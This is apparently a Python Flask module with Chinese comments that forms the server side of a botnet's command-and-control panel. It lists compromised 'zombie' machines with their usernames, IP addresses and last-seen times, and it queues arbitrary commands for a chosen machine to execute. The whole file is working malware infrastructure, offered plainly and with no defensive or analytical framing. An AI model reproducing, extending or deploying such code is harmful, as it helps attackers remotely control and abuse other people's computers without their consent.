from flask import Blueprint, jsonify, request
from models import db, ZOMBIE, Command_ZOMBIE
import logging
from datetime import datetime

zombie_bp = Blueprint('zombie', __name__)

@zombie_bp.route('/zombies', methods=['GET'])
def get_zombies():
    """獲取所有肉雞的資訊"""
    try:
        zombies = ZOMBIE.query.all()
        zombie_list = [{
            'id': zombie.id,
            'username': zombie.username,
            'ip_address': zombie.ip_address,
            'last_seen': zombie.last_seen
        } for zombie in zombies]
        
        return jsonify({
            'status': 'success',
            'zombies': zombie_list
        })
    except Exception as e:
        logging.error(f"獲取肉雞時出錯: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@zombie_bp.route('/zombie_commands', methods=['POST'])
def execute_zombie_command():
    """執行肉雞命令"""
    if not request.is_json:
        return jsonify({'error': '需要JSON數據'}), 400
    
    data = request.get_json()
    command = data.get('command')
    zombie_id = data.get('zombie_id')
    
    if not command:
        return jsonify({'error': '缺少命令'}), 400
    
    try:
        new_command = Command_ZOMBIE(
            command=command,
            user_id=zombie_id
        )
        db.session.add(new_command)
        db.session.commit()
        
        return jsonify({
            'status': 'success',
            'command_id': new_command.id
        })
    except Exception as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500 